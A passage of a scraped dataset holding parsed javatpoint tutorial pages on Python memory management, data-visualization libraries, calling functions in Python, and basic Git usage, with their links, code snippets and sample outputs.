structures that will be used in the program. Python memory manager manages the allocation or de-allocation of the heap memory space through the API functions.', ""As we know, everything in Python is object. The object can either be simple (containing numbers, strings, etc.) or containers (dictionary, lists, or user defined classes). In Python, we don't need to declare the variables or their types before using them in a program."", ""Reference counting states that how many times other objects reference an object. When a reference of the object is assigned, the count of object is incremented one. When references of an object are removed or deleted, the count of object is decremented. The Python memory manager performs the de-allocation when the reference count becomes zero. Let's make it simple to understand."", 'Suppose, there is two or more variable that contains the same value, so the Python virtual machine rather creating another object of the same value in the private heap. It actually makes the second variable point to that the originally existing value in the private heap.', ""The Python Garbage collector has classified the objects using its generation. Python Garbage collector has the three-generation. When we define the new object in the program, its life cycle is handled by the garbage collector's first generation. If the object has use in a different program, it will be stimulated up to the next generation. Every generation has a threshold."", ""In the above example, the value of the threshold increased for all three generations. It will affect the frequency of running the garbage collector. Programmers don't need to worry about the garbage collector, but it plays essential role in optimizing the Python runtime for the target system."", 'As we have discussed earlier, the Python interpreter handles the reference to object used in the program. It automatically frees the memory when the reference count becomes zero. This is a classical approach for reference counting, if it fails to work when the program has referenced cycles. The reference cycle occurs when one or more objects are referenced to each other. Hence the reference count never becomes zero.', 'We have created the reference cycle. The list1 object is referring the object list1 itself. When the function returns object list1, the memory for the object list1 is not freed up. So that reference counting is not suitable for solving the reference cycle. But, we can solve it by altering the garbage collector or performance of the garbage collector.', ""In the above code, we have created the list1 object referred by the list variable. The first element of the list object refers to itself. The list object's reference count is always greater than zero, even it is deleted or out of scope in the program."", ""CPython contains the object allocator that allocates memory within the object area. The object allocator gets a call every time the new object needs space. The allocator primary designs for small amount of data because Python doesn't involve too much data at a time. It allocates the memory when it is absolutely required."", ""Pools - It is composed of a single size class. A pool of the same size manages a double-linked list. A pool must be - used, full, or empty. A used pool consists of memory blocks for data to be stored. A full pool has all the allocated and contain data. An empty pool doesn't have any data and can be assigned any size class for the block when needed."", ""We define a list in Python; the memory allocator allocates the Heap's memory according to the list indexing, respectively. Suppose we need a sub-list to the given list, then we perform the list slicing. It is a straightforward way to get the sublist from the original list. Somehow, it is suitable for the small amount of data but not for the large data."", ""String concatenation is not suitable for saving space and time complexity. When possible, we should avoid using '+' for the string concatenation because strings are immutable. When we add the new string to the existing string, Python creates the new string and allocates it to a new address."", 'In this tutorial, we have discussed working of the memory internally in Python. We have learned how Python manages memory and also discussed default Python implementation. CPython is written in the C programming language. Python is a dynamic type of language that used the Heap data structure to store the memory.']","['static int a=10;', 'int *a;', 'p = new int;', 'print(a)', 'print(a)', 'if id(x) == id(y):', 'print(""The variables x and y are referring  to the same object"")', 'If id(x) == id(y):', 'print(""x and y do not refer to  the same object"")', 'Import GC', 'print(GC.get_threshold())', 'import gc', 'gc.set_threshold(800, 20, 20)', 'def cycle_create():', 'list1 = [18, 29, 15]', 'list1.append(list1)', 'return list1', 'cycle_create()', '[18, 29, 15, [...]]', 'import gc', 'n = gc.collect()', 'print(""Number of object:"", n)', 'import sys, gc', 'def cycle_create():', 'list1 = [18, 29, 15]', 'list1.append(list1)', 'def main():', 'print(""Here we are creating garbage..."")', 'for i in range(10):', 'cycle_create()', 'print(""Collecting the object..."")', 'num = gc.collect()', 'print(""Number of unreachable objects collected by GC:"", num)', 'print(""Uncollectable garbage:"", gc.garbage)', 'if __name__ == ""__main__"":', 'main()', 'sys.exit()', 'a = Mango', 'print(a)', 'a = a + "" Ice-cream""', 'print (a)', 'def __iter__(self):', ""''' This function allows are set to be iterable. Element can be looped over using the for loop'''"", 'return self. _generator()', 'def _generator(self):', '"""""" This function is used to implement the iterable. It stores the data we are currently on and gives the                      next item at each iteration of the loop.""""""', 'for i in self.items():', 'yield i']","['10', 'Traceback (most recent call last):', 'File """", line 1, in', 'print(x)', ""NameError : name 'a' is not defined"", 'x and y do not refer to the same object', '(700, 10, 10)', 'Here, we are creating garbage...', 'Collecting the object...', 'Number of unreachable objects collected by GC: 10', 'Uncollectable garbage: []', 'Mango', 'Mango Ice-cream']",[],['|||Static Memory Allocation|||Dynamic Memory Allocation||||||Avoid List Slicing ||||||Use List Indexing Carefully||||||String Concatenation ||||||Use Iterators and Generators||||||Use the Built-in Library when Possible|||']
146,['Python Libraries for Data Visualization'],"['Python programming language has different types of libraries for all kind of projects. Likewise, python has various libraries for visualization of Data, so that user can understand the dataset in very detailed way and analyze it properly.']","['https://www.javatpoint.com/how-to-call-a-function-in-python', 'https://www.javatpoint.com/python-memory-management', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/numpy-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/python-scipy', 'https://www.javatpoint.com/https://www.javatpoint.com/what-is-data-visualization', 'https://www.javatpoint.com/https://www.javatpoint.com/r-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/matplotlib', 'https://www.javatpoint.com/https://www.javatpoint.com/json-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/html-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/javascript-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/css-tutorial', 'https://www.javatpoint.com/how-to-call-a-function-in-python', 'https://www.javatpoint.com/python-memory-management', 'https://www.javatpoint.com/how-to-call-a-function-in-python']","['https://static.javatpoint.com/python/images/python-libraries-for-data-visualization.png', 'https://static.javatpoint.com/python/images/python-libraries-for-data-visualization2.png', 'https://static.javatpoint.com/python/images/python-libraries-for-data-visualization3.png', 'https://static.javatpoint.com/python/images/python-libraries-for-data-visualization4.png', 'https://static.javatpoint.com/python/images/python-libraries-for-data-visualization5.png', 'https://static.javatpoint.com/python/images/python-libraries-for-data-visualization6.png', 'https://static.javatpoint.com/python/images/python-libraries-for-data-visualization7.png', 'https://static.javatpoint.com/python/images/python-libraries-for-data-visualization8.png', 'https://static.javatpoint.com/python/images/python-libraries-for-data-visualization9.png', 'https://static.javatpoint.com/python/images/python-libraries-for-data-visualization10.png', 'https://static.javatpoint.com/python/images/python-libraries-for-data-visualization11.png']",[],"['Matplotlib', 'Seaborn', 'Ggplot', 'Bokeh', 'pygal', 'Plotly', 'Geoplotlib', 'Gleam', 'Missingno', 'Leather', 'Folium', 'Summary']",[],[],"['The Libraries for Data Visualization in Python programming are given below:', 'Plotly is a library used for data visualization. It is also an open platform where users can visualize and analyse the data online.', 'This library is used to draw chats and plots like dendrograms, 3 - Dimensional charts and contour plots.', 'Plotly library of python is developed on the top of Plotly JavaScript library.', 'Using gleam, users need to develop the basic plot, and they can build different fields on its top and later on can filter and sort the data easily.', 'Missingno is a library of the Python programming language used to deal with the dataset having missing values or messy values.', 'The user can use the filter and sort the dataset based on the completeness or spot the correlations using heatmap or dendrograms.', 'This library also made it easy to add possible locations of other users by using markers.', 'Folium library also has various plugins that can be seen on the map, including a plugin to Altair.', 'This article has discussed different types of Python libraries used for data visualization and analysis in more specific and detailed ways.']","['The benefit of visualization is that user can have visual access to large amounts of the dataset. Matplotlib is a library which is consists of various plots such as histogram, bar, line, scatter, etc.', 'Matplotlib comes with a huge variety of plots. Plots are helpful for understanding patterns, trends and for making correlations. It has instruments for reasoning about quantitative information.', 'As matplotlib was the very first library of data visualization in python, many other libraries are developed on top of it or designed to work parallel to it for the analysis of the dataset.', ""Seaborn is very helpful to explore and understand data in a better way. It provides a high level of a crossing point for sketching attractive and informative algebraic graphics. Let's understand the following example."", ""Ggplot is not designed to develop a high level of customized graphics. It has a simpler method of plotting with a lack of complexity. It is integrated with Pandas. Therefore, it's best to store data in a data frame while using ggplot."", 'SVGs work well with smaller datasets. So if the users are using a large data set and trying to create charts with a large number of data points, charts will have problems in execution and will become slow.', 'In the pygal library, it is easy to draw an attractive chart in just a few code lines because it has methods for all different chart types, and it also has built-in styles.', 'Geoplotlib is a library of Python language which allows the user to develop maps and plot geographical data. It is a library of the toolbox that are used to draw different types of maps such as heatmaps, dot - density maps and choropleths.', 'To use the geoplotlib library user needs to download Pyglet, which is an interface of an object-oriented programming language. Geoplotlib library plot the points of maps on OpenStreetMap tiles.', 'So, users do not need to learn any other programming language like JavaScript, HTML or CSS. Gleam can work with any data visualization library of python programming language.', 'This library provides a small toolset that is easy - to - use and flexible with missing data visualizations. It has utilities that help the user to get a rapidly visual summary of the completeness dataset.', 'Leather is a Python programming language library used to create charts for those who need charts immediately and do not care whether the chart is perfect.', 'This library works with every type of data set. This library creates the output chats of data as SVGs so that the users can measure the charts with the best quality.', 'The leather library is a new library, and still, some of its documentations are in progress. The charts created using this library are basic but of good quality, which is roughly made.', 'Folium is a library that makes ivery easy to visualize and analyse the data on an interactive leaflet map. This library has various built - in tilesets from different platforms like OpenStreetMaps, Stamen and Mapbox.', 'Folium library is easy to draw maps with markers. However, other libraries of python language are also capable of creating maps like Altair, boken and Plotly. Folium library uses OpenStreetMap, which gives a feel of Google map and a few code lines.']","['Each library of visualization has its own specification. Using the particular libraries for specific task helps the user to complete the task in more easy and accurate way. Some liberates work better than the others. In this article we will discuss pros and cons of the libraries to understand which library would be better for data visualization.', 'Matplotlib is a Library used for plotting graphs in the Python programming language. It is used plot 2 - dimensional arrays. Matplotlib is built on NumPy arrays. It is designed to work with the border SciPy stack. It was developed by John Hunter in 2002.', 'Seaborn is a library of Python programming basically used for making statistical graphics of the dataset. This library is built on top of the Matplotlib library. It is also integrated closely with Pandas, which is used for the data structure of Datasets.', 'The ggplot is a Python operation of the grammar for graphics. It is based on ggplot2, which is an R programming language plotting system. It has a different operating process than matplotlib, as it lets the user to layer components for creating a complete plot. The user can start layering from the axis, add points, then a line, afterward a trendline and so on.', 'Boken is a library of Python which is also based on the grammar of graphics, just like the ggplot. It is just inherent to Python language only. This library cannot be used in the R programming language. This library has the ability to build interactive, web-ready plots, which are the outputs of JSON objects, interactive web applications or HTML documents. This library of python language also allows streaming and real-time data.', 'There are three interfaces with different levels of control to put up different user types in the Bokeh library. The highest level of control is used to create charts rapidly. This library includes different methods of generating and plotting standard charts such as bar plots, histograms and box plots. The lowest level focuses on developers and software engineers.', ""This level has no pre - set defaults, and users have to define each element of the chart or plot. The middle level of control has the specifications same as the Matplotlib library. This level allows the users to control the basic development of blocks of every chart and plot. Let's understand the following example."", 'Pygal is a library of Python programming language which is also used for data visualization. This library also develops interactive plots, just like Bokeh and Plotly libraries. The interactive plots developed using the pygal library can be rooted inside the web browser. This library has the ability to provide the output chats of data as SVGs.', 'This library is used for developing interactive plots and charts. It is an open - source plotting library that allows nearly about 40 unique chart and plot types, covering a huge range of algebraic, economical, geographical 3 -Dimensional and scientific user cases.', 'It also has the feature of zooming and panning the map so that users can see more specifically. This library automatically handles the entire dataset loading, the projection of the map, and downloads the tiles of the map. It has graphics rending from OpenGL.', 'Gleam is used for data visualization in the Python programming language. It is inspired by the Shiny package of R programming language. This library is used to visualize and analyse the data of interactive web applications which use Python scripts only.', ""We have also discussed each library's different use and purpose and their unique features, like which library is used for what kind of plotting and creating charts and how we can manage to get more accurate and fast output visualization of our data set.""]","['import matplotlib.pyplot as pyplt', 'import numpy as np', 'np.random.seed ( 16 )', ""pyplt.ylable ( ' stepfilled ' )"", 'pyplt.show ( )', 'import seaborn as sns', 'sns.set ( color_codes = True)', 'import matplotlib.pyplot as plt', 'for i in range(n_rows):', 'fg,ax = plt.subplots(nrows=1,ncols=n_cols,sharey=True,figsize=(8, 2.4))', 'for j in range(n_cols):', 'sns.violinplot(x = data.Outcome, y=data[columns[idx]], ax=ax[j])', 'idx += 1', 'if idx >= 8:', 'break', 'from plotnine.data import economics', 'from plotnine import ggplot , aes , geom_line', 'ggplot ( economics ) #what data to use', '+ aes ( x = "" price "" ) #what variables to use', '+geom_line ( ) #Geometric object to use for creating graphs.', 'from bokeh.plotting import figure , output_file , show', 'from bokeh.sampledata.stocks import AAPL', ""aapl = np.array ( AAPL [ ' adj_close ' ] )"", ""aaply_city = np.array ( AAPL [ ' city ' ] , dtype = np.city.temperature(F)"", 'windows_size = 30', 'window = np.ones ( windows_Size ) / float ( windows _size )', 'import pygal', 'box_plot = pygal.Box()', ""box_plot.title = ' V8 benchmark result '"", ""box_plot.add ( ' Chrome ', [ 6394, 8211, 7519, 7217, 12463, 1659, 2122, 8606 ] )"", ""box_plot.add ( ' Firefox ', [ 7472, 8098, 11699, 2650, 6360, 1043, 3796, 9449 ] )"", ""box_plot.add ( ' Opera ', [ 3471, 2932, 4202, 5228, 5811, 1827, 9012, 4668 ] )"", ""box_plot.add ( ' IE ', [ 42, 40, 58, 78, 143, 135, 33, 101 ] )"", 'import plotly.graph_objects as ply', '# Add data', ""months = [ ' Jan ', ' Feb ', ' Mar ', ' Apr ', ' May ', ' June ', ' July ',' Aug ', ' Sep ', ' Oct ', ' Nov ', ' Dec ']"", 'high_2010 = [ 31.5, 36.6, 48.9, 52.0, 68.1, 74.4, 75.5, 75.6, 69.7, 59.6, 44.1, 28.3 ]', 'low_2010 = [ 12.8, 21.3, 31.5, 36.2, 50.9, 55.1, 56.7, 57.3, 50.2, 41.8, 30.6, 14.9 ]', 'high_2015 = [ 35.5, 25.6, 42.6, 51.3, 70.5, 80.4, 81.5, 81.2, 75.0, 66.3, 45.1, 34.0 ]', 'low_2015 = [ 22.6, 13.0, 26.0, 35.8, 46.6, 56.7, 57.9, 60.2, 52.3, 47.5, 30.0, 22.6 ]', 'high_2020 = [ 27.8, 27.5, 36.0, 55.8, 68.7, 78.7, 77.5, 76.8, 73.1, 61.6, 44.3, 38.9 ]', 'low_2020 = [ 11.7, 13.3, 17.6, 34.5, 48.9, 57.0, 59.0, 57.6, 50.7, 44.2, 31.2, 28.1 ]', 'fig = go.Figure ()', '# Create and style traces', ""fig.add_trace ( ply.Scatter( x = month, y = high_2020, name='High 2020',line = dict ( color = ' firebrick ', width = 4 ) ) )"", ""fig.add_trace ( ply.Scatter( x = month, y = low_2020, name = ' Low 2020', line = dict ( color = ' royalblue ', width = 4 ) ))"", ""fig.add_trace ( ply.Scatter( x = month, y = high_2015, name = 'High 2015', line = dict(color = 'firebrick', width = 4, dash = 'dash' ) # here in this code dash options also involve 'dash', 'dot', and 'dashdot' ) )"", ""fig.add_trace (ply.Scatter ( x = month, y = low_2015, name = 'Low 2015', line = dict ( color = 'royalblue', width = 4, dash = 'dash' ) ) )"", ""fig.add_trace (ply.Scatter ( x = month, y=high_2010, name='High 2010',"", ""line = dict(color='firebrick', width=4, dash='dot')))"", ""fig.add_trace (ply.Scatter ( x = months, y = low_2010, name='Low 2010', line = dict ( color = 'royalblue', width = 4, dash = 'dot') ) )"", '# Editing the layout of the graph', ""fig.update_layout ( title = 'Average High and Low Temperatures in NYC',"", ""xaxis_title = ' Months ',"", ""yaxis_title = ' Temperatures ( degrees F ) ' )"", 'fig.show ()', 'import geoplotlib', 'from geoplotlib.utils import BoundingBox', 'from geoplotlib.colors import ColorMap', 'import json', '# find the unemployment rate of the particular county, and then change it to color', 'def get_color ( properties ):', ""key = str ( int ( properties [ ' STATE ' ] ) ) + properties [ ' COUNTRY ' ]"", 'if key in unemployment:', ""return cmap.to_color ( unemployment.get ( key ) , .15, ' lin ' )"", 'else:', 'return [ 0, 0, 0, 0 ]', ""with open (' sample /data /unemployment.json ' ) as fin:"", 'unemployment = json.load ( fin )', ""cmap = ColorMap (' Blues ', alpha = 255, levels = 10 )"", ""geoplotlib.geojson (' samples /data/ gz_2010_us_050_00_20m.json ' , fill = True , color = get_color , f_tooltip = lambda properties: properties[ ' NAME ' ] )"", ""geoplotlib.geojson ( ' samples/ data/ gz_2010_us_050_00_20m.json ' , fill = False , color = [ 255 , 255 , 255 , 64 ] )"", 'geoplotlib.set_bbox (BoundingBox.USA )', 'geoplotlib.show ( )', 'from wtforms import fields', 'from ggplot import *', 'from gleam import Page, panels', 'class ScatterInput ( panels.Inputs ) :', 'title = fields.StringField ( label = "" Title of plot : "" )', 'yvar = fields.SelectField ( label = "" Y axis "" ,', 'choices = [ ( "" beef "" , "" Beef "" ) ,', '( "" pork "" , "" Pork "" ) ] )', 'smoother = fields.BooleanField ( label = "" Smoothing Curve "" )', 'import missingno as mgno', '%matplotlib inline', 'mgno.matrix ( collisions.samples ( 250 ) )', 'import random', 'import leather', 'dot_dat = [ ( random.randint ( 0 , 10 ) , random.randint ( 0 , 10 ) for i in range ( 100 ) ]', 'def colorizer ( d ) :', ""return ' rgb ( %i , %, %i ) ' % ( d.x , d.y , 10 )"", ""chart = leather.chart ( ' first ' )"", 'import folium', 'M = folium.Map ( location = [ 26.987675 , 67.989654 ] )']",[],[],['|||Matplotlib|||Ggplot|||Pygal|||Missingno|||Seaborn|||Plotly|||Gleam|||Leather|||Geoplotlib|||Bokeh|||Folium|||']
147,['How to call a function in Python?'],"['As we know, functions are the block of statements used to perform some specific tasks in programming. It also helps to break the large group of code into smaller chunks or modules. Functions can be called anywhere and the number of times in a program. It allows us to reuse the code by simply calling the particular function or block in a program. Thus, it avoids the repetition of the same code. We can define functions inside the class, modules, nested functions, etc.']","['https://www.javatpoint.com/git-modules-in-python', 'https://www.javatpoint.com/python-libraries-for-data-visualization', 'https://www.javatpoint.com/git-modules-in-python', 'https://www.javatpoint.com/python-libraries-for-data-visualization', 'https://www.javatpoint.com/git-modules-in-python']",[],[],[],"['Features of Functions', 'Rules for defining a function', 'Create a function in Python', 'Function Calling in Python', 'Calling Nested Function in Python', 'Functions as First-Class Objects', 'Properties of First-Class functions']","['Note: To call an inner function, we must first call the outer function. If the external function is not invoked, the inner function will not be executed.']","['Following are the features of Python Functions:', 'To create a function, we need to use a def keyword to declare or write a function in Python. Here is the syntax for creating a function:', ""Let's create a function program in Python."", 'Consider the following example to print the Welcome Message using a function in Python.', 'CallFun.py', 'In the above example, we call the MyFun() function that prints the statements.', 'Program to print the multiplication of two numbers using the nested function in Python.', 'Nest_arg.py', 'Create a program to understand Python functions as an object.', 'Write a program to call a function inside the class.', 'Student.py']","['Once a function is created in Python, we can call it by writing function_name() itself or another function/ nested function. Following is the syntax for calling a function.']","[""When we construct one function inside another, it is called a nested function. We can create nested functions using the def keyword. After creating the function, we have to call the outer and the inner function to execute the statement. Lets' create a program to understand the concept of nested functions and how we can call these functions."", 'As we can see in the above example, the InFun() function is defined inside the OutFun() function. To call the InFun() function, we first call the OutFun() function in the program. After that, the OutFun() function will start executing and then call InFun() as the above output.', 'In Python, the functions as First-Class Objects. Because it treats the same as the object, and it has the same properties and method as an object. A function can be assigned to a variable, pass them as an argument, store them in data structures and return a value from other functions. It can be manipulated, such as other objects in Python. Furthermore, all the data in the Python program is represented in the objects or relations. Hence it is also called first-class citizens of Python function.']","['def function_name(): # use def keyword to define the function', 'Statement to be executed', 'return statement # return a single value.', 'def myFun(): # define function name', 'print("" Welcome to JavaTpoint"")', 'myFun() # call to print the statement', 'def function_name():', 'Statement1', 'function_name() # directly call the function', '# calling function using built-in function', 'def function_name():', ""str = function_name('john') # assign the function to call the function"", 'print(str) # print the statement', 'def MyFun():', 'print(""Hello World"")', 'print("" Welcome to the JavaTpoint"")', 'MyFun() # Call Function to print the message.', 'def OutFun(): # outer function', 'print(""Hello, it is the outer function"")', 'def InFun(): # inner function', 'print(""Hello, It is the inner function"")', 'InFun() # call inner', 'OutFun() # call outer function', 'def fun1(): # outer function', 'a = 6 # define variable', 'def fun2(b): # inner function', 'a = 4 # inner variable', 'print (""Display the sum of inner function"", a + b) # sum of inner function', 'print (""Display the value of outer variable"", a) # it displays the value of outer function    fun2(4)  # Inner function', 'def MyObject(text): # Pass an argument.', 'return text.upper()', '# Call the function inside the print() function.', 'print (MyObject(""Welcome to JavaTpoint""))', 'str = MyObject # assign the function to a variable', '# call the function using the str variable.', 'print (str(""Hello, Welcome to JavaTpoint""))', 'class Student:', 'Roll_no = 101', 'name = ""Johnson""', 'def show(self):', 'print("" Roll no. is %d\\nName of student is %s"" % (self.Roll_no, self.name))', 'stud = Student() # Create the stud object of Student class', 'stud.show()   # call the function using stud object.']","['Welcome to JavaTpoint', 'Hello World', 'Welcome to the JavaTpoint', 'Hello, it is the outer function', 'Hello, it is the inner function', 'Display the value of outer variable 6', 'Display the sum of inner function 8', 'WELCOME TO JAVATPOINT', 'HELLO, WELCOME TO JAVATPOINT', 'Roll no. is 101', 'Name of student is Johnson']",[],"['|||It is used to avoid repetitions of code.|||Using the function, we can divide a group of code into smaller modules.|||It helps to hide the code and create clarity to understand the modules.|||It allows code to be reusable, thus saving memory.|||Statements written inside a function can only be executed with a function name.|||Python function starts with def and then a colon (:) followed by the function name.||||||The def keyword is used in the Python function to declare and define a function.|||The function name must begin with the following identifiers such as: A-Z, a- z, and underscore (_).|||Every function must follow colon (:) and then indention to write the program.|||In a Python function, the reserved word cannot be used as a function name or identifier.|||In Python, the function parameter can be empty or multiples.||||||Functions can be assigned to a variable|||A function is an example of an object type.|||We also return the function from a function.|||Functions have the same properties and methods as objects|||The function is treated as an object to pass as an argument to another function.|||']"
148,['Git Modules in Python'],"[""In this article, we will discuss the Git module in the Python programming language, how users can use it in projects of Python. We will also discuss how users can use git modules in conjunction with GitHub so that we can work on large projects with other users. We will also learn how to create a git repository, how to see all the project files' history, how we can go back to when our project's initial stage and how to add new files and modifies them in the repository.""]","['https://www.javatpoint.com/top-python-frameworks-for-gaming', 'https://www.javatpoint.com/how-to-call-a-function-in-python', 'https://www.javatpoint.com/https://www.javatpoint.com/git', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/git-repository', 'https://www.javatpoint.com/https://www.javatpoint.com/git-log', 'https://www.javatpoint.com/https://www.javatpoint.com/what-is-github', 'https://www.javatpoint.com/https://www.javatpoint.com/git-ignore', 'https://www.javatpoint.com/https://www.javatpoint.com/git-add', 'https://www.javatpoint.com/https://www.javatpoint.com/git-status', 'https://www.javatpoint.com/top-python-frameworks-for-gaming', 'https://www.javatpoint.com/how-to-call-a-function-in-python', 'https://www.javatpoint.com/top-python-frameworks-for-gaming']","['https://static.javatpoint.com/python/images/git-modules-in-python.png', 'https://static.javatpoint.com/python/images/git-modules-in-python2.png', 'https://static.javatpoint.com/python/images/git-modules-in-python3.png', 'https://static.javatpoint.com/python/images/git-modules-in-python4.png', 'https://static.javatpoint.com/python/images/git-modules-in-python5.png', 'https://static.javatpoint.com/python/images/git-modules-in-python6.png', 'https://static.javatpoint.com/python/images/git-modules-in-python7.png', 'https://static.javatpoint.com/python/images/git-modules-in-python8.png', 'https://static.javatpoint.com/python/images/git-modules-in-python9.png', 'https://static.javatpoint.com/python/images/git-modules-in-python10.png', 'https://static.javatpoint.com/python/images/git-modules-in-python11.png', 'https://static.javatpoint.com/python/images/git-modules-in-python12.png', 'https://static.javatpoint.com/python/images/git-modules-in-python13.png', 'https://static.javatpoint.com/python/images/git-modules-in-python14.png']",[],"['What Is Git?', '.gitignore', 'What user should not add to a Git Repository?', 'Git Log', 'Conclusion']",['Basic Usage of Git Module'],[],"['Till now, we know the Git module in general. This topic will discuss how users can start working with Git modules on their local computer system.', 'Step 1: Creating a new repository', 'To start working with Git module, users first need to enter their information. They have to set a username with the git configuration command.', 'Users can initialize the empty Git repository in / home / tmp / sample /. git /', 'After creating a repository, users can search it on the Git module. The Git module command user uses the most frequently is the Git status:', ""And that's how we create a repository."", 'Step 2. Add a new file to the Repository', 'Create a file in the repository that Git does not know about it. Create the file sample.py using the editor, which has only a print statement in it.', 'After this, if the user will run the Git status command again, they will see the different results:', 'Making a Commit Changes', 'The Staging Area of the Git Module', 'For example:', 'After this, modify the sample.py file to include the example.py and call its function:', 'For example:', 'For example:', 'To add example.py sample.py files to the repository, the user needs to do the same they did earlier.', 'For example:', 'Now, the user should commit the changes and should finish the clean - up:', 'whenever the user runs the git status command, they will see _pycache_ directory like this:', 'For example:', 'The file .gitignore is just a regular text file, and this can be added to the repository just like the other regular files.', 'For example:', 'For example:', 'For example:', 'Sample.py is a source file, while', 'Sample.pyc is the generated file.', 'The reasons for not involving the generated files in the Git repository:', 'Git log is the command of the Git module. Git log is used to seeing the history of the commits made by the user.', 'For example:']","['By using git modules, users can also compare the files of the projects with different commits. Git module also allows the user to return any file or files back to the earlier state of the project with very little effort.', 'After the setup of the username, users would need a repository to work in. Creating a Repository is very easy. Users can use the git initialization command in the directory:', 'This output shows a couple of the information to the user, like on which branch they are on and that they have nothing to commit. Nothing to commit means that there is no file in the directory that the Git module is not aware of.', 'Now Git is aware of the new file sample.py, and it will list the file under changes to be committed. The addition of the file to the Git module transfers it into the staging area. This means users can now commit the file to the repository.', 'After running the git status command again, it shows that the user now has a clean working directory, which means that all the changes in the file are not committed to Git.', 'The staging area of the Git module shows the exact content of the file when the user run git add command. If the user modifies this again, the file will be visible on both the areas, staging and unstaging of the git status output.', 'At any stage of working with the git module on the file, which has already been committed once, there are three versions of the file available on which users can work:', 'All of the three versions of the file can be different from one another. By moving the changes to the staging area of the users and then committing the files, they can bring back all these versions of the file into the sync.', 'if the user wants all the _pycache_ directory and its content to be ignored, then they have to add a .gitignore file in their repository. This is a very simple process. Users have to edit the file in their chosen editor.', 'Then, users have to run the git status command, and they no longer see the _pycache_ directory and its content. Although the user will see the new .gitignore ! file.', 'There is one more entrance in the .gitignore file, which is the directory that the user store in their virtual environments. This directory is called virtualenvs. The virtualenvs directory is normally known as env or venv.', 'Users can add these to their .gitignore files of the project. By doing this, the directory or the files of the project present in the repository will be ignored. And if there is no file or directory is present then, no action will be done.', ""Users can also store a global .gitignore file in their home directory. This process is very easy and simple if the user's editor uses to save the temporary files or makes a back - up files in the local directory of the computer system."", 'The basic rule of all version control systems is that the user should only add source files in the version control systems and never add the generated files to the version control system.', 'The source file is any file that the user creates while typing in the editor. The generated files are the files that the computer creates while processing the source files.', 'When the user is working on the Git module, or storing files on the GitHub repositories do not save the confidential information in the repository, while sharing it publicly.']","['Git module of Python language is a distributed version control system. A version control system is a set of tools used for tracking the past of a set of files of the projects. Users can easily save the state of files at any point by instructing the Git version control system. After this, the user can continue to edit the files of the project and save the project at any state. Saving the project at any current state is like keeping a backup of the project directory. In the Git module, saving the state is referred to as making a commit.', 'Whenever a user makes a commit in the Git module, the user adds a commit message that explains all the changes made in that state of the project. Git module can show all the history of changes and commits made by the user in the project. This feature of the git module really helps the users to figure out what work they have done and look specifically for all the bugs that crept into the systems.', ""The distributed version control system is slightly different from the version control system. The earlier version control system works by saving all the commits locally on the user's hard drive. This collection of commits on the local hard drive of the user's is known as a repository. But due to this, users are not able to work with the team working on the same codebase. As working with the team on the same project, users need their repository to be saved on the platform where all the other team members can access it. A Distributed version control system saves the repository on a chief server, which can be shared by many users and developers. This also has the feature of file locking."", 'For Git modules, most of the users and developers use GitHub as a central repository, where anyone can access the file. GitHub is like a central place where anyone can share the code, and everyone can access that. The full repository is still saved at all the local repos even after using GitHub.', 'After checking the new file, the Git module will tell the user that the file is untracked. That means Git is saying that the particular file is not a part of the repository and is not under version control. Users can fix this by adding the new file to Git. Using the git add command for adding the file to the Git module.', 'Whenever a User commits changes, they are telling the Git module to save this level of state of the file in the repository. Users can do it by using the commit command of the git module. The -m option in the command informs the git module to commit the following message. If the users do not use the -m while running the command, the Git module will open the editor for the users to create the commit message. To commit the message user should write the command like this:', 'Users can now see that the commit command has returned a couple of information, most of it is not much useful, but it does tell the user that only one file has changed because the user has only added one file in the repository. The commit command also informs the simple hashing algorithm of the commit (775ca29).', ""Git module has a staging area, which is mostly referred to as the index. The staging area is where the Git module keeps track of the change's user wants to do in their next commit. Whenever the user runs the Git Add command, like above, where a new file sample.py was moved to the staging area, this change was shown in the git status. The file of the project was moved from the untracked section of the git module to the to be committed section of the output."", 'The git status command in the Git module is very accessible, and users can use it most often. But sometimes, users might find out that there are couples of files that are showing up on the untracked section of the git module, and they do not want the git modules to see them. For that, the user can use a .gitignore file.', 'Whenever the user imports a local module, the Python starts compiling the module into byte code and saves the file on their filesystem. In the Python2, after compiling the module into bytecode, it will save the file in the form example.pyc. But in the case of python3, it will generate a _pycache_ directory and store the .pyc file in it.', 'After doing this, if the user runs the command of git status, they will see that particular directory present in the untracked section. Users can also see that their example.py file is in the untracked section, but the changes they made to sample.py are in the new section, which is known as ""Changes not staged for commit"". This section means that the changes a user made earlier have not been added to the staging area of the git module.', 'When the users are in the initial stage of working on any version control tool, and most probably with the Git module. The user would want to store every kind of file in the repository of the Git but this a mistake. Git module does have limitations and also security concerns due to which users face some limits on what type of files and data they can add to the git repository.', 'Git module repository does not save the full replica of each file of the project the user commit. Instead, the repository uses the complicated algorithm, which is based on how different following versions of the files. This reduces the quantity of storage file needs. But this algorithm does not apply to the binary files as the binary files such as MP3 or JPG files do not have good difference tools. For binary files, the Git module repository has to save the full file of the project whenever the user makes the commit.', 'Users can see the history of commits made by the user in the git repository. All the commit message will appear in the order they were made. The starting of the commit will be identified by the word ""commit"" and after the simple hashing area of the commit. Git log command will provide the history of every simple hashing areas.', 'This article has discussed the Git modules, version control system, how to make commit in Git and its repository functions, rules of adding files and information in the repositories of the Git module and GitHub. The different types of Git command like .gitignore, git log, git add, git status, etc., and their use in the files of project and directories.']","['$ git config -- global user.name "" name of the user goes here ""', '$ git config - global user.email ""username@forexample.com""', '$ mkdir sample', '$ cd sample', '$ git init', '$ git status', '#Sample.py', ""print ( ' Adding a New File ! ' )"", '$ git status', '$ git add sample.py', '$ git status', '$ git commit -m "" creating sample.py ""', '$ git status', ""#Let's create a new Python file of the project in the same directory called example.py:"", '#example.py', 'Def get_example ( ) :', 'return "" cow ""', '#sample.py', 'import example', 'example = example.get_example ( )', 'print ( "" Animal { } "" .format (example) )', '$ git status', '$ git add example.py sample.py', '$ git status', '$ git commit -m "" add example module ""', '$ git status', '# .gitignore', '__pycache__', '$ git status', '$ git add .gitignore', '$ git commit - add "" create .gitignore ""', '# .gitignore', '__pycache__', 